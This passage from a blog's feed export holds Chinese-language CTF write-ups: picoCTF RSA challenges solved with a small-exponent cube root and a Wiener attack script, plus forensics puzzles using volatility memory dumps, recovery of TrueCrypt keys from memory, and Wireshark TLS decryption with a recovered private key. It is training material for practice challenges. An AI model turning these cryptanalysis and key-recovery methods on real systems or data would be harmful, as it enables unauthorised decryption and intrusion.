41130)</p><blockquote><p>RSA info</p></blockquote></blockquote><p>RSA层层解密：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># nc jupiter.challenges.picoctf.org 41130</span><br><span class="line">Good morning class! It&#39;s me Ms. Adleman-Shamir-Rivest</span><br><span class="line">Today we will be taking a pop quiz, so I hope you studied. Cramming just will not do!</span><br><span class="line">You will need to tell me if each example is possible, given your extensive crypto knowledge.</span><br><span class="line">Inputs and outputs are in decimal. No hex here!</span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 60413</span><br><span class="line">p : 76753</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">n</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">n: 4636878989</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">p : 54269</span><br><span class="line">n : 5051846941</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">q: 93089</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">e : 3</span><br><span class="line">n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">p</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):n</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 66347</span><br><span class="line">p : 12611</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">totient(n)</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">totient(n): 836623060</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717</span><br><span class="line">e : 3</span><br><span class="line">n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">ciphertext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">ciphertext: 256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323</span><br><span class="line">e : 3</span><br><span class="line">n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">plaintext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):n</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559</span><br><span class="line">p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637</span><br><span class="line">e : 65537</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">d</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">d: 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729</span><br><span class="line">Outstanding move!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### NEW PROBLEM ####</span><br><span class="line">p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433</span><br><span class="line">ciphertext : 18031488536864379496089550017272599246134435121343229164236671388038630752847645738968455413067773166115234039247540029174331743781203512108626594601293283737392240326020888417252388602914051828980913478927759934805755030493894728974208520271926698905550119698686762813722190657005740866343113838228101687566611695952746931293926696289378849403873881699852860519784750763227733530168282209363348322874740823803639617797763626570478847423136936562441423318948695084910283653593619962163665200322516949205854709192890808315604698217238383629613355109164122397545332736734824591444665706810731112586202816816647839648399</span><br><span class="line">e : 65537</span><br><span class="line">n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">plaintext</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y&#x2F;N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">plaintext: picoCTF&#123;wA8_th4t$_ill3aGal..ode01e4bb&#125;</span><br><span class="line">That&#39;s not an int! Exiting</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="tapping"><em>Tapping</em></span></h3><blockquote><p>[Tapping](Theres tapping coming in from the wires. What’s it saying nc <a class="link" href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org<i class="fas fa-external-link-alt"></i></a> 28927.)</p><blockquote><p>What kind of encoding uses dashes and dots?The flag is in the format PICOCTF{}</p></blockquote></blockquote><p>摩斯电码解密。</p><h3><span id="mr-worldwide"><em>Mr-Worldwide</em></span></h3><blockquote><p>[Mr-Worldwide](A musician left us a message. What’s it mean?)</p></blockquote><p>坐标，百度可查找经纬度，提取城市首字母得flag.</p><h3><span id="flags"><em>Flags</em></span></h3><blockquote><p>[Flags](What do the flags mean?)</p><blockquote><p>The flag is in the format PICOCTF{}</p></blockquote></blockquote><p>简单的替换密码，百度找到对应网站和图片即可。<a class="link" href="https://en.wikipedia.org/wiki/International_maritime_signal_flags">https://en.wikipedia.org/wiki/International_maritime_signal_flags<i class="fas fa-external-link-alt"></i></a></p><h3><span id="waves-over-lambda"><em>waves over lambda</em></span></h3><blockquote><p>[waves over lambda](We made a lot of substitutions to encrypt this. Can you decrypt it? Connect with nc <a class="link" href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org<i class="fas fa-external-link-alt"></i></a> 1981.)</p><blockquote><p>Flag is not in the usual flag format</p></blockquote></blockquote><p>同为词频分析，观察后猜测jgsk=flag，丢进<a class="link" href="https://quipqiup.com/">在线网站<i class="fas fa-external-link-alt"></i></a>求解得flag.</p><h3><span id="minirsa"><em>miniRSA</em></span></h3><blockquote><p><a class="link" href="https://play.picoctf.org/practice/challenge/73?category=2&amp;page=1">miniRSA<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>RSA tutorial;How could having too small an e affect the security of this 2048 bit key?Make sure you don’t lose precision, the numbers are pretty big (besides the e value)</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">N&#x3D;29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673</span><br><span class="line">e&#x3D;3</span><br><span class="line">c&#x3D;2205316413931134031074603746928247799030155221252519872650080519263755075355825243327515211479747536697517688468095325517209911688684309894900992899707504087647575997847717180766377832435022794675332132906451858990782325436498952049751141 </span><br><span class="line">m &#x3D; int(gmpy2.iroot(c, e)[0])</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">print(m)</span><br><span class="line">#b&#39;picoCTF&#123;n33d_a_lArg3r_e_d0cd6eae&#125;&#39;</span><br><span class="line">#13016382529449106065894479374027604750406953699090365388203722801043052339225981</span><br></pre></td></tr></table></figure><h3><span id="b00tl3grsa2"><em>b00tl3gRSA2</em></span></h3><blockquote><p>[b00tl3gRSA2](In RSA d is a lot bigger than e, why don’t we use d to encrypt instead of e? Connect with nc <a class="link" href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org<i class="fas fa-external-link-alt"></i></a> 42900.)</p><blockquote><p>What is e generally?</p></blockquote></blockquote><p>nc后发现e很大，维纳攻击脚本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import  RSAwienerHacker</span><br><span class="line">c&#x3D;67725484828660171155495211630497256983804750771405173604915475315285337259554745019946599487641055680169265457644340938264529723371169972500050850583888499676593738216542714158045211992126456724042909731789545505279795504523037528761238149430515678580782074452909931229053012113137701929175885390372056497999</span><br><span class="line">n&#x3D;92908556262738254094065441172814586106067369443369499189214986491976931561738844273516700957530563178532708425726354645373760924007923816005398578319882528611540185427918571906094044173194388663365364134997826444445816336765012006409280712402476371185929572990909183399977560298360727962550970347800300222711</span><br><span class="line">e&#x3D;69520159460585947518483836148643582831918423640590763549444035011978832519891224565191960240113848478143117452571748866357688968863765140502139873387990270685914837356707507222866135679527601234329281217279226396840073020368275802208410100769859080342284164663788369069928003055037897805163984210272130270657</span><br><span class="line">d &#x3D;  RSAwienerHacker.hack_RSA(e,n)</span><br><span class="line">if d:</span><br><span class="line">    print(d)</span><br><span class="line">#import hashlib</span><br><span class="line">import binascii</span><br><span class="line">#flag &#x3D;hashlib.md5(hex(d)).hexdigest()</span><br><span class="line">#print flag</span><br><span class="line">m&#x3D;pow(c,d,n)</span><br><span class="line">print(hex(m))</span><br></pre></td></tr></table></figure><p>十六进制转字符串后得明文。</p><h3><span id="john_pollard"><em>john_pollard</em></span></h3><blockquote><p>[john_pollard](Sometimes RSA certificates are breakable)</p><blockquote><p>The flag is in the format picoCTF{p,q};Try swapping p and q if it does not work</p></blockquote></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;span id=&quot;forensics&quot;&gt;Forensics&lt;/span&gt;&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;glory-of-the-garden&quot;&gt;&lt;em&gt;Glory of the Garden&lt;/em&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;blockquote&gt;</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
  </entry>
  
  <entry>
    <title>MISC-data-2</title>
    <link href="http://mklkx.github.io/2021/03/22/MISC-data-2/"/>
    <id>http://mklkx.github.io/2021/03/22/MISC-data-2/</id>
    <published>2021-03-22T12:32:24.000Z</published>
    <updated>2021-05-13T12:37:45.727Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="data2">Data[2]</span></h3><hr><h3><span id="21"><em>21</em></span></h3><h4><span id="xman2018排位赛file"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。来源：<a class="link" href="https://github.com/hebtuerror404/CTF_competition_warehouse_2018">https://github.com/hebtuerror404/CTF_competition_warehouse_2018<i class="fas fa-external-link-alt"></i></a></p></blockquote><p>得到attachment.img</p><p>第一感觉是volatility,失败</p><p>学到了新招</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete attachment.img --restore-all</span><br></pre></td></tr></table></figure><p>恢复被删除的目录或文件</p><p>得到RECOVERED_FILES/file.17</p><p><img lazyload src="/images/loading.svg" data-src="6CpQmT.png" alt="6CpQmT"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;fugly_cats_need_luv_2&#125;</span><br></pre></td></tr></table></figure><h3><span id="22"><em>22</em></span></h3><h4><span id="greatescape"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>不明所以，稍作记录。</p><p>得到一个数据包，通过追踪发现存在ssc.key，格式类似rsa私钥，另存为</p><p>编辑-&gt;首选项-&gt;protocols-&gt;TLS 把刚才的key通过本地导入</p><p>追踪http得到flag</p><h3><span id="23"><em>23</em></span></h3><h4><span id="bsidessf2019diskimage"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>得到一张图片</p><p>binwalk foremost都无果的情况下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg -a diskimage.png</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="6iNTjH.png" alt="6iNTjH"></p><p>&quot;b8,rgb,lsb,xy&quot;中存在东西</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg -e &#39;b8,rgb,lsb,xy&#39; diskimage.png &gt; disk.dat</span><br></pre></td></tr></table></figure><p>导出</p><p>用testdisk进行分析</p><p><img lazyload src="/images/loading.svg" data-src="6iU1V1.png" alt="6iU1V1"></p><p>回车</p><p><img lazyload src="/images/loading.svg" data-src="6iU3Ux.png" alt="6iU3Ux"></p><p>回车</p><p><img lazyload src="/images/loading.svg" data-src="6iU856.png" alt="6iU856"></p><p>找到其中最与众不同的那一个</p><p>根据提示，按C拷贝到想要的位置</p><p>查看</p><p><img lazyload src="/images/loading.svg" data-src="6iUJPK.png" alt="6iUJPK"></p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CTF&#123;FAT12_FTW&#125;</span><br></pre></td></tr></table></figure><h3><span id="24"><em>24</em></span></h3><h4><span id="rctf2019disk"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>得到encrypt.vmdk</p><p>一时没有方向，拖进010看到</p><p><code>rctf&#123;unseCure_quick_form4t_vo1ume</code></p><p>试图打开vmdk却被告知压缩包已损坏</p><p>这里学到一招，可以用7z</p><p><a class="link" href="https://sparanoid.com/lab/7z/">https://sparanoid.com/lab/7z/<i class="fas fa-external-link-alt"></i></a></p><p>可以看到有一个0.fat</p><p>但无法直接操作</p><p>通过‘提取’得到0.fat</p><p><img lazyload src="/images/loading.svg" data-src="6VXsun.png" alt="6VXsun"></p><p>[FAT文件可以使用VeraCrypto进行挂载]</p><p><a class="link" href="https://www.veracrypt.fr/en/Downloads.html">https://www.veracrypt.fr/en/Downloads.html<i class="fas fa-external-link-alt"></i></a></p><p>存在密码，rctf能解</p><p>到这一步挂载成功：</p><p><img lazyload src="/images/loading.svg" data-src="6VXouR.png" alt="6VXouR"></p><p>看看是啥：</p><p><img lazyload src="/images/loading.svg" data-src="6VXouR.png" alt="6VXouR"></p><p>给了另一个密码：RCTF2019</p><p>这里体现了神奇之处：在挂载输入密码的时候，不同的密码可以进入不同的文件系统</p><p>重新挂载：</p><p>却被告知无法访问，需要格式化等</p><p>参考之前，但无法直接拖入010，换winhex试试</p><p>winhex-&gt;Tools-&gt;Open Disk-&gt;Select Disk,选择挂载的盘</p><p>得到后半部分</p><p><code>_and_corrupted_1nner_v0lume&#125;</code></p><p><code>rctf&#123;unseCure_quick_form4t_vo1ume_and_corrupted_1nner_v0lume&#125;</code></p><h3><span id="25"><em>25</em></span></h3><h4><span id="vampn2020-公开赛内存取证"></span></h4><blockquote><p><a class="link" href="http://dd.zhaoj.in/3ehg38dgey84d3dhou32d3/mem.raw">http://dd.zhaoj.in/3ehg38dgey84d3dhou32d3/mem.raw<i class="fas fa-external-link-alt"></i></a>得到的 flag 请包上 flag{} 提交。Hint:记事本</p></blockquote><p>这是一道复现地很费劲的题😂</p><p>得到mem.raw和VOL(VOL对应后面链接失效的地方,按下不表)</p><p>内存取证起手式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw imageinfo</span><br></pre></td></tr></table></figure><p>得到可能版本后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 pslist</span><br></pre></td></tr></table></figure><p>查看进程</p><p><img lazyload src="/images/loading.svg" data-src="6mEkTO.png" alt="6mEkTO"></p><p>关注</p><p>TrueCrypt.exe   3364notepad.exe     3552mspaint.exe     2648</p><p>分别dumpit</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3364 --dump-dir&#x3D;.&#x2F;</span><br><span class="line"></span><br><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3552 --dump-dir&#x3D;.&#x2F;</span><br><span class="line"></span><br><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 2648 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><p>挨个看</p><p>1)mspaint</p><p>此处需要用到Gimp工具，一个类似画图的工具得到密码：</p><p>1YxfCQ6goYBD6Q</p><p>2)notepad</p><p>使用editbox插件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 editbox</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="6mVbIU.png" alt="6mVbIU"></p><p>得到网盘链接，但已失效，对应题干中的VOL</p><p>3)TrueCrypt</p><p>TrueCrypt破解工具Elcomsoft Forensic Disk Decryptor</p><p>Decrypt or mount disk-&gt;TrueCrypt-&gt;select&amp;Memory dump&amp;Browse-&gt;mount</p><p>发现多了个盘，其中存在key</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uOjFdKu1jsbWI8N51jsbWI8N5</span><br></pre></td></tr></table></figure><p>得到VOL的时候就该想到需要挂载，使用VeraCrypt,按之前学到的用法</p><p>此处注意需要勾选TrueCrypt</p><p><img lazyload src="/images/loading.svg" data-src="6me96s.png" alt="6me96s"></p><p>得到fffflag.zip</p><p>fffflag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RoarCTF&#123;wm_D0uB1e_TC-cRypt&#125;</span><br></pre></td></tr></table></figure><h3><span id="26"><em>26</em></span></h3><h4><span id="ddctf2018流量分析"></span></h4><blockquote><p>提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c提示二：注意补齐私钥格式-----BEGIN RSA PRIVATE KEY-----XXXXXXX-----END RSA PRIVATE KEY-----</p><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="ddctf1.png" alt="ddctf1"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;E5&#x3D;B0&#x3D;8F&#x3D;E5&#x3D;BC&#x3D;A0&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E5&#x3D;A5&#x3D;BD&#x3D;EF&#x3D;BC&#x3D;9A</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E5&#x3D;A5&#x3D;BD&#x3D;EF&#x3D;BC&#x3D;8C&#x3D;E8&#x3D;AF&#x3D;B7&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E5&#x3D;B0&#x3D;86&#x3D;E5&#x3D;AF&#x3D;86&#x3D;E9&#x3D;92&#x3D;A5&#x3D;E5&#x3D;AE&#x3D;89&#x3D;E8&#x3D;A3&#x3D;85&#x3D;E5&#x3D;88&#x3D;B0&#x3D;E6&#x3D;9C&#x3D;8D&#x3D;E5&#x3D;8A&#x3D;A1&#x3D;E5&#x3D;99&#x3D;A8&#x3D;E4&#x3D;B8&#x3D;8A&#x3D;E3&#x3D;80&#x3D;82&#x3D;E8&#x3D;B0&#x3D;A2&#x3D;E8&#x3D;B0&#x3D;A2</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br></pre></td></tr></table></figure><p>Quoted-Printable</p><p><a class="link" href="http://www.mxcz.net/tools/quotedprintable.aspx">http://www.mxcz.net/tools/quotedprintable.aspx<i class="fas fa-external-link-alt"></i></a></p><p>解码后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">小张你好：</span><br><span class="line">你好，请你将密钥安装到服务器上。谢谢</span><br></pre></td></tr></table></figure><p>以及一堆base64编码传输数据</p><p>解码后得到png</p><p><img lazyload src="/images/loading.svg" data-src="ddctf2.png" alt="ddctf2"></p><p>识图后调了好久</p><p>补齐私钥格式后，</p><p>wireshark里，编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;RSA keys list-&gt;Edit</p><p>再追踪其中的http流</p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DDCTF&#123;0ca2d8642f90e10efd9092cd6a2831c0&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;data2&quot;&gt;Data[2]&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;21&quot;&gt;&lt;em&gt;21&lt;/em&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;xman2018排位赛file&quot;&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;blockqu</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-image-2</title>
    <link href="http://mklkx.github.io/2021/03/22/MISC-image-2/"/>
    <id>http://mklkx.github.io/2021/03/22/MISC-image-2/</id>
    <published>2021-03-22T12:19:30.000Z</published>
    <updated>2021-05-04T11:39:44.519Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="image2">image[2]</span></h3><hr><h3><span id="21">21</span></h3><h4><span id="网鼎杯-2020-青龙组虚幻2"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>不明全部，稍做记录。</p><p>得到一张类似二维码的小图</p><p><a href="https://imgtu.com/i/6Pbpan"><img lazyload src="/images/loading.svg" data-src="https://s3.ax1x.com/2021/03/01/6Pbpan.png" alt="6Pbpan.png" border="0"></a></p><p>将其分离出rgb三个通道（笔者用的stegsolve）</p><p>根据拼接，得到类似汉信码</p><p>存在一定的爆破和容差</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">from random import randint</span><br><span class="line"></span><br><span class="line">for k in range(5):</span><br><span class="line"># 用到的三张图片就是上面说的 RGB 通道分开的图片（未放大10倍）</span><br><span class="line">    R &#x3D; Image.open(&#39;solved_r.bmp&#39;)</span><br><span class="line">    G &#x3D; Image.open(&#39;solved_g.bmp&#39;)</span><br><span class="line">    B &#x3D; Image.open(&#39;solved_b.bmp&#39;)</span><br><span class="line">    GBR &#x3D; Image.new(&#39;RGB&#39;, (31, 31))</span><br><span class="line">    TMP &#x3D; Image.new(&#39;RGB&#39;, (7, 7))</span><br><span class="line">    GBRReadble &#x3D; Image.new(&#39;RGB&#39;, (372, 372))</span><br><span class="line"></span><br><span class="line">    n_r &#x3D; 0</span><br><span class="line">    n_g &#x3D; 0</span><br><span class="line">    n_b &#x3D; 0</span><br><span class="line">    p_r &#x3D; R.load()</span><br><span class="line">    p_g &#x3D; G.load()</span><br><span class="line">    p_b &#x3D; B.load()</span><br><span class="line">    pim &#x3D; GBR.load()</span><br><span class="line">    pimr &#x3D; GBRReadble.load()</span><br><span class="line">    tmp &#x3D; TMP.load()</span><br><span class="line"></span><br><span class="line">    for i in range(31):</span><br><span class="line">        if i%3 &#x3D;&#x3D; 0:</span><br><span class="line">            for j in range(31):</span><br><span class="line">                pim[i, j] &#x3D; p_g[j, n_g]</span><br><span class="line">            n_g &#x3D; n_g + 1</span><br><span class="line">        elif i%3 &#x3D;&#x3D; 1:</span><br><span class="line">            for j in range(31):</span><br><span class="line">                pim[i, j] &#x3D; p_b[j, n_b]</span><br><span class="line">            n_b &#x3D; n_b + 1</span><br><span class="line">        elif i%3 &#x3D;&#x3D; 2:</span><br><span class="line">            for j in range(31):</span><br><span class="line">                pim[i, j] &#x3D; p_r[j, n_r]</span><br><span class="line">            n_r &#x3D; n_r + 1</span><br><span class="line"></span><br><span class="line">    for i in range(0, 7):</span><br><span class="line">        for j in range(0, 7):</span><br><span class="line">            tmp[i, j] &#x3D; pim[i, j]</span><br><span class="line">            </span><br><span class="line">    TMP &#x3D; TMP.rotate(180)</span><br><span class="line">    tmp &#x3D; TMP.load() </span><br><span class="line"></span><br><span class="line">    for i in range(0, 7):</span><br><span class="line">        for j in range(0, 7):</span><br><span class="line">            pim[i, j] &#x3D; tmp[i, j]       </span><br><span class="line">           </span><br><span class="line">    for i in range(14, 23):</span><br><span class="line">        for j in range(24, 31):</span><br><span class="line">            if (randint(0, 1) &#x3D;&#x3D; 0):</span><br><span class="line">                pim[i, j] &#x3D; (0,0,0)</span><br><span class="line">                </span><br><span class="line">    for i in range(372):</span><br><span class="line">        for j in range(372):</span><br><span class="line">            pimr[j, i] &#x3D; (255,255,255)</span><br><span class="line"></span><br><span class="line">    for i in range(31,341):</span><br><span class="line">        for j in range(31,341):</span><br><span class="line">            pimr[j, i] &#x3D; pim[(j-31)&#x2F;&#x2F;10, (i-31)&#x2F;&#x2F;10]</span><br><span class="line"></span><br><span class="line">    GBRReadble &#x3D; GBRReadble.rotate(90)</span><br><span class="line"></span><br><span class="line">    filename &#x3D; &quot;gbr&quot;+ str(k) + &quot;.png&quot;</span><br><span class="line">    GBRReadble.save(filename)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考：</p><p><a class="link" href="https://blog.csdn.net/r42135d1r2r4/article/details/106063796">https://blog.csdn.net/r42135d1r2r4/article/details/106063796<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://www.cnblogs.com/p201821440039/p/12900273.html">https://www.cnblogs.com/p201821440039/p/12900273.html<i class="fas fa-external-link-alt"></i></a></p><h3><span id="22">22</span></h3><h4><span id="inshack201710-cl0v3rf13ld-lane-signal"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>得到find_me.unk</p><p>010分析，后缀名改为.jpg</p><p>得到一张图片，写着MONSTERS COME IN MANY FORMS</p><p>尝试提交，不对</p><p>foremost分离，得到png图片，写着摩斯电码的字典，右下角发现不寻常</p><p><img lazyload src="/images/loading.svg" data-src="6i8yPe.png" alt="6i8yPe"></p><p>通过解密：HELPME</p><p>尝试提交，不对</p><p>继续搜索，Png文件尾存在ogg文件，通过查询是一种音频文件</p><p>另存为.ogg</p><p>au中查看，明显莫斯，解码得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;M0R53_W1LL_N3V3R_4G3!&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;image2&quot;&gt;image[2]&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
